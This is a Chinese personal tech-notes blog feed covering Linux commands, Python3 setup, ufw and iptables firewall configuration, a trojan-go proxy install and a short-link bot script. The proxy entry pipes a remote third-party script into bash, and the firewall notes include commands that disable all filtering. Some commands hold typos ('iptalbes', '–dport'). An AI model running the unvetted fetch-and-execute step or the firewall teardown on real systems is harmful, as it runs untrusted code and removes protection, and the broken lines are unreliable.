<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">显示文件或目录，带上-a表示加上显示隐藏目录或文件，加上-l表示以列表显示</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">切换到不同的目录</span><br><span class="line"><span class="built_in">cd</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切换到根目录</span></span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="comment">#切换到当前用户的Home目录</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="comment">#返回上一级目录</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment">#切换到根目录下的etc目录 </span></span><br><span class="line"><span class="built_in">cd</span> /etc/</span><br><span class="line"><span class="comment">#用于创建目录</span></span><br><span class="line"><span class="built_in">mkdir</span></span><br><span class="line"><span class="comment">#在当前目录下创建一个名为tmp的目录</span></span><br><span class="line"><span class="built_in">mkdir</span> temp</span><br><span class="line"><span class="comment">#-p表示创建多级目录，即先创建一个temp，再在tmp下创建一个user目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p temp/user/</span><br><span class="line"><span class="comment">#表示在当前目录下生成</span></span><br><span class="line"><span class="built_in">mkdir</span> ./temp</span><br><span class="line"><span class="comment">#表示在根目录下生成</span></span><br><span class="line"><span class="built_in">mkdir</span> ../temp</span><br><span class="line"><span class="comment">#用于删除目录</span></span><br><span class="line"><span class="built_in">rmdir</span></span><br><span class="line">如目录为空，直接删除即可</span><br><span class="line"><span class="comment">#若目录不为空，使用目录名进行删除</span></span><br><span class="line"><span class="built_in">rm</span> -rf </span><br><span class="line"><span class="comment">#创建空文件</span></span><br><span class="line"><span class="built_in">touch</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建一个hello.text</span></span><br><span class="line"><span class="built_in">touch</span> hello.txt</span><br><span class="line"><span class="comment">#可以一次性创建多个文件</span></span><br><span class="line"><span class="built_in">touch</span> h1.txt h2.txt</span><br><span class="line"><span class="comment">#用于拷贝文件：cp 源文件 目标文件</span></span><br><span class="line"><span class="built_in">cp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝单个文件也可以将整个目录进行拷贝，使用参数-r。比如将test文件夹中拷贝到test2文件夹中：</span></span><br><span class="line"><span class="built_in">cp</span> -r <span class="built_in">test</span>/ test2/</span><br><span class="line"><span class="comment">#使用\cp进行强制覆盖相同名称文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除文件或目录</span></span><br><span class="line"><span class="built_in">rm</span></span><br><span class="line"><span class="comment">#可选参数</span></span><br><span class="line"><span class="comment">#递归删除整个文件夹</span></span><br><span class="line">-r</span><br><span class="line"><span class="comment">#强制删除不提示</span></span><br><span class="line">-f</span><br><span class="line">强制删除整个文件或目录</span><br><span class="line"><span class="built_in">rm</span> -fr</span><br><span class="line"><span class="comment">#移动文件与目录或者重命名</span></span><br><span class="line"><span class="built_in">mv</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#都在当前目录操作为重命名</span></span><br><span class="line"><span class="built_in">mv</span> aaa.txt bbb.txt</span><br><span class="line"><span class="comment">#移动文件或目录</span></span><br><span class="line"><span class="built_in">mv</span> /home/test/aa /home/bb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看文件内容，带上参数-n显示行号，只能浏览文件，但不能修改</span></span><br><span class="line"><span class="built_in">cat</span></span><br><span class="line">可以使用<span class="built_in">cat</span> -n 文件名 | more进行分页显示 </span><br><span class="line"><span class="comment">#基于vi编辑器的文本过滤器，以全屏幕的方式显示文本文件中的内容。相关参数</span></span><br><span class="line">more</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于分屏查看文件内容，对于显示大文件具有较高效率</span></span><br><span class="line">less</span><br><span class="line"><span class="comment">#输出重定向</span></span><br><span class="line"> &gt;</span><br><span class="line"><span class="comment">#追加</span></span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>ls -l &gt; 文件名：覆盖相关文件中的内容,，例如ls -l &gt; a.txt：将ls -l显示的内容写入到a.txt中，如果a.txt文件不存在就创建一个：</p>
<p>ls -al &gt;&gt; 文件名：向相关文件中追加内容<br>cat 文件1 &gt; 文件2：将文件1的内容覆盖到文件2<br>echo “内容” &gt;&gt; 文件：将内容写入到文件中<br>echo：输出内容到控制台。</p>
<p>head：显示文件的开头部分，默认显示文件开头10行内容，可用head -n 行数 文件名，来指定显示多少行。 </p>
<p>tail：与head相反，默认显示文件尾部10行，也可使用tail -n 行数 文件名，来进行修改。使用tai -f 文件名：实时追踪文档的所有更新。</p>
<p>ln：软连接，也叫符号链接，类似于windows的快捷方式。</p>
<p>ln -s &#x2F;root linkToRoot 将&#x2F;root路径连接到linkToRoot，输入cd linkToRoot可进入到&#x2F;root<br>删除软连接：rm -rf linkToRoot，删除时不是linkToRoot&#x2F;<br>history：查看已经执行过的历史指令。</p>
<p>不带任何参数显示所有的<br>history 10：显示最近使用的10个<br>!指令编号：相当于执行该指令</p>
]]></content>
      <categories>
        <category>os</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>python3 解释器</title>
    <url>/posts/ba3c4ea9/</url>
    <content><![CDATA[<p>Python3 解释器<br>Linux&#x2F;Unix的系统上，一般默认的 python 版本为 2.x，我们可以将 python3.x 安装在 &#x2F;usr&#x2F;local&#x2F;python3 目录中。</p>
<p>安装完成后，我们可以将路径 &#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin 添加到您的 Linux&#x2F;Unix 操作系统的环境变量中，这样您就可以通过 shell 终端输入下面的命令来启动 Python3 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ PATH=<span class="variable">$PATH</span>:/usr/local/python3/bin/python3    <span class="comment"># 设置环境变量</span></span><br><span class="line">$ python3 --version</span><br><span class="line">Python 3.4.0</span><br></pre></td></tr></table></figure>
<p>在Window系统下你可以通过以下命令来设置Python的环境变量，假设你的Python安装在 C:\Python34 下:</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">path</span>=<span class="variable">%path%</span>;C:\python34</span><br></pre></td></tr></table></figure>
<p>交互式编程<br>我们可以在命令提示符中输入”Python”命令来启动Python解释器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3</span><br><span class="line">执行以上命令后，出现如下窗口信息：</span><br><span class="line"></span><br><span class="line">$ python3</span><br><span class="line">Python 3.4.0 (default, Apr 11 2014, 13:05:11) </span><br><span class="line">[GCC 4.8.2] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p>在 python 提示符中输入以下语句，然后按回车键查看运行效果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Hello, Python!&quot;</span>);</span><br><span class="line">以上命令执行结果如下：</span><br><span class="line"></span><br><span class="line">Hello, Python!</span><br></pre></td></tr></table></figure>
<p>当键入一个多行结构时，续行是必须的。我们可以看下如下 if 语句：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; flag = True</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">if</span> flag :</span><br><span class="line">...     <span class="built_in">print</span>(<span class="string">&quot;flag 条件为 True!&quot;</span>)</span><br><span class="line">... </span><br><span class="line">flag 条件为 True!</span><br></pre></td></tr></table></figure>
<p>脚本式编程<br>将如下代码拷贝至 hello.py文件中：</p>
<p>print (“Hello, Python!”);<br>通过以下命令执行该脚本：</p>
<p>python3 hello.py<br>输出结果为：</p>
<p>Hello, Python!<br>在Linux&#x2F;Unix系统中，你可以在脚本顶部添加以下命令让Python脚本可以像SHELL脚本一样可直接执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/env python3</span></span><br><span class="line">然后修改脚本权限，使其有执行权限，命令如下：</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">chmod</span> +x hello.py</span><br><span class="line">执行以下命令：</span><br><span class="line"></span><br><span class="line">./hello.py</span><br><span class="line">输出结果为：</span><br><span class="line"></span><br><span class="line">Hello, Python!</span><br></pre></td></tr></table></figure>
<p>文章内容和代码来源于<a href="https://www.runoob.com/python3/python3-interpreter.html">Python3 解释器</a>，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>coding</category>
        <category>python3</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title>python3 环境搭建</title>
    <url>/posts/c86a54/</url>
    <content><![CDATA[<p>Python3 可应用于多平台包括 Windows、Linux 和 Mac OS X。</p>
<p>Unix (Solaris, Linux, FreeBSD, AIX, HP&#x2F;UX, SunOS, IRIX, 等等。)<br>Win 9x&#x2F;NT&#x2F;2000<br>Macintosh (Intel, PPC, 68K)<br>OS&#x2F;2<br>DOS (多个DOS版本)<br>PalmOS<br>Nokia 移动手机<br>Windows CE<br>Acorn&#x2F;RISC OS<br>BeOS<br>Amiga<br>VMS&#x2F;OpenVMS<br>QNX<br>VxWorks<br>Psion<br>Python 同样可以移植到 Java 和 .NET 虚拟机上。</p>
<p>Python3 下载<br>Python3 最新源码，二进制文档，新闻资讯等可以在 Python 的官网查看到：</p>
<p>Python 官网：<a href="https://www.python.org/">https://www.python.org/</a></p>
<p>你可以在以下链接中下载 Python 的文档，你可以下载 HTML、PDF 和 PostScript 等格式的文档。</p>
<p>Python文档下载地址：<a href="https://www.python.org/doc/">https://www.python.org/doc/</a></p>
<p>Python 安装<br>Python 已经被移植在许多平台上（经过改动使它能够工作在不同平台上）。</p>
<p>您需要下载适用于您使用平台的二进制代码，然后安装 Python。</p>
<p>如果您平台的二进制代码是不可用的，你需要使用C编译器手动编译源代码。</p>
<p>编译的源代码，功能上有更多的选择性， 为 Python 安装提供了更多的灵活性。</p>
<p>以下是各个平台安装包的下载地址：</p>
<p>Source Code 可用于 Linux 上的安装。</p>
<p>以下为不同平台上安装 Python3 的方法。</p>
<p>Unix &amp; Linux 平台安装 Python3:<br>以下为在 Unix &amp; Linux 平台上安装 Python 的简单步骤：</p>
<p>打开 WEB 浏览器访问 <a href="https://www.python.org/downloads/source/">https://www.python.org/downloads/source/</a><br>选择适用于 Unix&#x2F;Linux 的源码压缩包。<br>下载及解压压缩包 Python-3.x.x.tgz，3.x.x 为你下载的对应版本号。<br>如果你需要自定义一些选项修改 Modules&#x2F;Setup<br>以 Python3.6.1 版本为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tar -zxvf Python-3.6.1.tgz</span></span><br><span class="line"><span class="comment"># cd Python-3.6.1</span></span><br><span class="line"><span class="comment"># ./configure</span></span><br><span class="line"><span class="comment"># make &amp;&amp; make install</span></span><br><span class="line">检查 Python3 是否正常可用：</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3 -V</span></span><br><span class="line">Python 3.6.1</span><br></pre></td></tr></table></figure>
<p>Window 平台安装 Python:<br>以下为在 Window 平台上安装 Python 的简单步骤。</p>
<p>打开 WEB 浏览器访问 <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a> ，一般就下载 executable installer，x86 表示是 32 位机子的，x86-64 表示 64 位机子的。</p>
<p>记得勾选 Add Python 3.6 to PATH。</p>
<p>按 Win+R 键，输入 cmd 调出命令提示符，输入 python:</p>
<p>也可以在开始菜单中搜索 IDLE：</p>
<p>MAC 平台安装 Python:<br>MAC 系统都自带有 Python2.7 环境，你可以在链接 <a href="https://www.python.org/downloads/mac-osx/">https://www.python.org/downloads/mac-osx/</a> 上下载最新版安装 Python 3.x。</p>
<p>你也可以参考源码安装的方式来安装。</p>
<p>环境变量配置<br>程序和可执行文件可以在许多目录，而这些路径很可能不在操作系统提供可执行文件的搜索路径中。</p>
<p>path(路径)存储在环境变量中，这是由操作系统维护的一个命名的字符串。这些变量包含可用的命令行解释器和其他程序的信息。</p>
<p>Unix 或 Windows 中路径变量为 PATH（UNIX 区分大小写，Windows 不区分大小写）。</p>
<p>在 Mac OS 中，安装程序过程中改变了 Python 的安装路径。如果你需要在其他目录引用 Python，你必须在 path 中添加 Python 目录。</p>
<p>在 Unix&#x2F;Linux 设置环境变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在 csh shell: 输入</span><br><span class="line">setenv PATH <span class="string">&quot;<span class="variable">$PATH</span>:/usr/local/bin/python&quot;</span>, 按下 Enter。</span><br><span class="line">在 bash shell (Linux) 输入 :</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:/usr/local/bin/python&quot;</span> 按下 Enter 。</span><br><span class="line">在 sh 或者 ksh shell 输入:</span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$PATH</span>:/usr/local/bin/python&quot;</span> 按下 Enter。</span><br><span class="line">注意: /usr/local/bin/python 是 Python 的安装目录。</span><br></pre></td></tr></table></figure>

<p>在 Windows 设置环境变量<br>在环境变量中添加Python目录：</p>
<p>在命令提示框中(cmd) : 输入</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">path</span>=<span class="variable">%path%</span>;C:\Python 按下&quot;Enter&quot;。</span><br><span class="line">注意: C:\Python 是Python的安装目录。</span><br></pre></td></tr></table></figure>

<p>也可以通过以下方式设置：<br>右键点击”计算机”，然后点击”属性”<br>然后点击”高级系统设置”<br>选择”系统变量”窗口下面的”Path”,双击即可！<br>然后在”Path”行，添加python安装路径即可(我的D:\Python32)，所以在后面，添加该路径即可。 ps：记住，路径直接用分号”；”隔开！<br>最后设置成功以后，在cmd命令行，输入命令”python”，就可以有相关显示。</p>
<p>Python 环境变量<br>下面几个重要的环境变量，它应用于Python：</p>
<p>变量名 描述<br>PYTHONPATH  PYTHONPATH是Python搜索路径，默认我们import的模块都会从PYTHONPATH里面寻找。<br>PYTHONSTARTUP Python启动后，先寻找PYTHONSTARTUP环境变量，然后执行此变量指定的文件中的代码。<br>PYTHONCASEOK  加入PYTHONCASEOK的环境变量, 就会使python导入模块的时候不区分大小写.<br>PYTHONHOME  另一种模块搜索路径。它通常内嵌于的PYTHONSTARTUP或PYTHONPATH目录中，使得两个模块库更容易切换。</p>
<p>运行 Python<br>有三种方式可以运行 Python：</p>
<p>1、交互式解释器：<br>你可以通过命令行窗口进入 Python 并开始在交互式解释器中开始编写 Python 代码。<br>你可以在 Unix、DOS 或任何其他提供了命令行或者 shell 的系统进行 Python 编码工作。</p>
<p>Unix&#x2F;Linux</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python             </span><br></pre></td></tr></table></figure>
<p>或者<br>Windows&#x2F;DOS</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="function">C:&gt;<span class="title">python</span></span></span><br></pre></td></tr></table></figure>
<p>以下为 Python 命令行参数：</p>
<p>选项  描述<br>-d  在解析时显示调试信息<br>-O  生成优化代码 ( .pyo 文件 )<br>-S  启动时不引入查找Python路径的位置<br>-V  输出Python版本号<br>-X  从 1.6版本之后基于内建的异常（仅仅用于字符串）已过时。<br>-c cmd  执行 Python 脚本，并将运行结果作为 cmd 字符串。<br>file  在给定的python文件执行python脚本。<br>2、命令行脚本<br>在你的应用程序中通过引入解释器可以在命令行中执行Python脚本，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Unix/Linux</span><br><span class="line">$ python  script.py</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">Windows/DOS</span><br><span class="line"><span class="function">C:&gt;<span class="title">python</span> <span class="title">script.py</span></span></span><br></pre></td></tr></table></figure>
<p>注意：在执行脚本时，请检查脚本是否有可执行权限。</p>
<p>3、集成开发环境（IDE：Integrated Development Environment）: PyCharm<br>PyCharm 是由 JetBrains 打造的一款 Python IDE，支持 macOS、 Windows、 Linux 系统。</p>
<p>PyCharm 功能 : 调试、语法高亮、Project管理、代码跳转、智能提示、自动完成、单元测试、版本控制……</p>
<p>PyCharm 下载地址 : <a href="https://www.jetbrains.com/pycharm/download/">https://www.jetbrains.com/pycharm/download/</a></p>
<p>PyCharm 安装地址：<a href="http://www.runoob.com/w3cnote/pycharm-windows-install.html">http://www.runoob.com/w3cnote/pycharm-windows-install.html</a></p>
<p>Professional（专业版，收费）：完整的功能，可试用 30 天。</p>
<p>Community（社区版，免费）：阉割版的专业版。</p>
<p>安装 PyCharm 中文插件，打开菜单栏 File，选择 Settings，然后选 Plugins，点 Marketplace，搜索 chinese，然后点击 install 安装：</p>
<p>文章内容和代码来源于<a href="https://www.runoob.com/python3/python3-install.html">Python3 环境搭建</a>，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>coding</category>
        <category>python3</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu 下使用 ufw 配置防火墙（简化 iptables 的操作）</title>
    <url>/posts/d320dd43/</url>
    <content><![CDATA[<p>UFW全称为Uncomplicated Firewall，是Ubuntu系统上配置iptables防火墙的工具。UFW提供一个非常友好的命令用于创建基于IPV4，IPV6的防火墙规则。 但是，UFW是没有界面的，就是用命令的那一种，所以，操作起来就不是那么的方便，有人帮它写了个界面，名字就叫做“Gufw”。</p>
<p>由于Ubuntu下的iptables操作起来比较复杂，依赖关系比较多，所以使用UFW时可以简化很多操作。当然Debian同样适用。</p>
<p>无论是桌面版还是服务器版, UFW的命令行用法是一样的。</p>
<h1 id="一、安装UFW"><a href="#一、安装UFW" class="headerlink" title="一、安装UFW"></a>一、安装UFW</h1><p>首先，用如下命令来检查下系统上是否已经安装了UFW。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo dpkg --get-selections | grep ufw</span><br></pre></td></tr></table></figure>
<p>如还没有安装，可以使用apt命令来安装，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install ufw</span><br></pre></td></tr></table></figure>
<p>在使用前，你应该检查下UFW是否已经在运行。用下面的命令来检查：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo ufw status</span><br></pre></td></tr></table></figure>
<p>如果你发现状态是：inactive , 意思是没有被激活或不起作用。</p>
<h1 id="二、使用方法"><a href="#二、使用方法" class="headerlink" title="二、使用方法"></a>二、使用方法</h1><h2 id="1、启用"><a href="#1、启用" class="headerlink" title="1、启用"></a>1、启用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">sudo ufw default deny </span><br></pre></td></tr></table></figure>
<p>#作用：开启了防火墙并随系统启动同时关闭所有外部对本机的访问（本机访问外部正常）。</p>
<h2 id="2、关闭"><a href="#2、关闭" class="headerlink" title="2、关闭"></a>2、关闭</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
<h2 id="2、查看防火墙状态"><a href="#2、查看防火墙状态" class="headerlink" title="2、查看防火墙状态"></a>2、查看防火墙状态</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw status</span><br></pre></td></tr></table></figure>
<h2 id="3、开启-禁用相应端口或服务举例"><a href="#3、开启-禁用相应端口或服务举例" class="headerlink" title="3、开启&#x2F;禁用相应端口或服务举例"></a>3、开启&#x2F;禁用相应端口或服务举例</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 80 <span class="comment">#允许外部访问80端口</span></span><br><span class="line">sudo ufw delete allow 80 <span class="comment">#禁止外部访问80 端口</span></span><br><span class="line">sudo ufw allow from 192.168.1.1 <span class="comment">#允许此IP访问所有的本机端口</span></span><br><span class="line">sudo ufw deny smtp <span class="comment">#禁止外部访问smtp服务，#以服务名代表端口，可以使用less /etc/services列出所有服务信息, 其中包括该服务使用了哪个端口和哪种协议</span></span><br><span class="line">sudo ufw delete allow smtp <span class="comment">#删除上面建立的某条规则，或者sudo ufw delete allow 80/tcp，如果出现无法删除，可以用序号：sudo ufw status numbered，然后通过序号删除sudo ufw delete 1</span></span><br><span class="line">sudo ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 22 <span class="comment">#要拒绝所有的TCP流量从10.0.0.0/8 到192.168.0.1地址的22端口</span></span><br><span class="line"><span class="comment">#可以允许所有RFC1918网络（局域网/无线局域网的）访问这个主机（/8,/16,/12是一种网络分级）：</span></span><br><span class="line">sudo ufw allow from 10.0.0.0/8</span><br><span class="line">sudo ufw allow from 172.16.0.0/12</span><br><span class="line">sudo ufw allow from 192.168.0.0/16</span><br></pre></td></tr></table></figure>
<h2 id="4、重置所有规则"><a href="#4、重置所有规则" class="headerlink" title="4、重置所有规则"></a>4、重置所有规则</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw reset</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu 安装和配置 iptables 防火墙</title>
    <url>/posts/b24f733c/</url>
    <content><![CDATA[<p>启动iptables</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modprobe ip_tables</span><br></pre></td></tr></table></figure>
<p>关闭iptables（关闭命令要比启动复杂）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptalbes -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">modprobe -r ip_tables</span><br></pre></td></tr></table></figure>
<p>依次执行以上命令即可关闭iptables，否则在执行modproble -r ip_tables时将会提示FATAL: Module ip_tables is in use.</p>
<p>清除预设表filter中的所有规则链的规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br></pre></td></tr></table></figure>
<p>清除预设表filter中使用者自定链中的规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -X</span><br></pre></td></tr></table></figure>
<p>以数字形式查看iptables规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -L -n</span><br></pre></td></tr></table></figure>
<p>抛弃所有不符合三种链规则的数据包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br></pre></td></tr></table></figure>
<p>设置 本地进程 lo 的 INPUT 和 OUTPUT 链接，eth0 的 INPUT 链</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line">iptables -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -jACCEPT</span><br><span class="line">iptables -A INPUT -i eth0 -m state --state NEW,INVALID -j LOG</span><br><span class="line">iptables -A OUTPUT -o lo -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>开放SSH端口22</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -i eth0 --dport ssh -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>开放Web端口80</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -i eth0 --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>开放FTP端口21、20</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>删除FTP端口21、20</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line">iptables -D INPUT -p tcp --dport 21 -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>允许loopback(不然会导致DNS无法正常关闭等问题)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IPTABLES -A INPUT -i lo -p all -j ACCEPT  (如果是INPUT DROP)</span><br><span class="line">IPTABLES -A OUTPUT -o lo -p all -j ACCEPT (如果是OUTPUT DROP)</span><br></pre></td></tr></table></figure>
<p>保存iptables规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-save &gt; /etc/network/iptables.up.rules</span><br></pre></td></tr></table></figure>
<p>iptables规则自动保存与自动加载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces</span><br></pre></td></tr></table></figure>
<p>修改 &#x2F;etc&#x2F;network&#x2F;interfaces ，添加下面末尾2行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">pre-up iptables-restore &lt; /etc/network/iptables.up.rules</span><br><span class="line">post-down iptables-save &gt; /etc/network/iptables.up.rules</span><br></pre></td></tr></table></figure>


<p>关闭防火墙才可以,可以使用以下代码.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo apt-get purge netfilter-persistent</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>或者开通必要端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -I INPUT -s 0.0.0.0/0 -p tcp –dport 8888 -j ACCEPT</span><br><span class="line">sudo iptables -I INPUT -s 0.0.0.0/0 -p tcp –dport 80 -j ACCEPT</span><br><span class="line">sudo iptables -I INPUT -s 0.0.0.0/0 -p tcp –dport 443 -j ACCEPT</span><br><span class="line">sudo iptables-save</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install iptables-persistent -y</span><br><span class="line">sudo netfilter-persistent save</span><br><span class="line">sudo netfilter-persistent reload</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>trojan-go 一键搭建</title>
    <url>/posts/4d23db92/</url>
    <content><![CDATA[<p>更新系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update -y</span><br><span class="line">apt install -y curl</span><br><span class="line">apt install -y socat</span><br><span class="line">yum install -y curl  <span class="comment">#CentOS</span></span><br><span class="line">sudo apt install -y curl  <span class="comment">#Ubuntu/Debian</span></span><br></pre></td></tr></table></figure>

<p>Trojan一键代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -sSL <span class="string">&quot;https://raw.githubusercontent.com/veip007/hj/main/trojan-go.sh&quot;</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>放行端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -I INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>proxy</category>
        <category>trojan</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>trojan</tag>
      </tags>
  </entry>
  <entry>
    <title>base64 加密的长网址转换短网址</title>
    <url>/posts/16ce46f5/</url>
    <content><![CDATA[<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [rule: 网址?]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> wz = <span class="title function_">param</span>(<span class="number">1</span>) <span class="comment">//匹配规则第一个问号的值</span></span><br><span class="line">  <span class="keyword">var</span> ab = <span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;https://www.mxnzp.com/api/shortlink/create?url=&quot;</span>+wz+<span class="string">&quot;&amp;app_id=xxx&amp;app_secret=xxx&quot;</span>,</span><br><span class="line">       <span class="string">&quot;dataType&quot;</span>: <span class="string">&quot;json&quot;</span>, <span class="comment">//这里接口直接返回文本，所以不需要指定json类型数据</span></span><br><span class="line">  &#125;)</span><br><span class="line">    </span><br><span class="line"><span class="title function_">sendText</span>(<span class="string">&quot;短链接：&quot;</span> + ab.<span class="property">data</span>.<span class="property">shortUrl</span> + <span class="string">&quot;\n长链接：&quot;</span> + ab.<span class="property">data</span>.<span class="property">url</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>coding</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>javascript</tag>
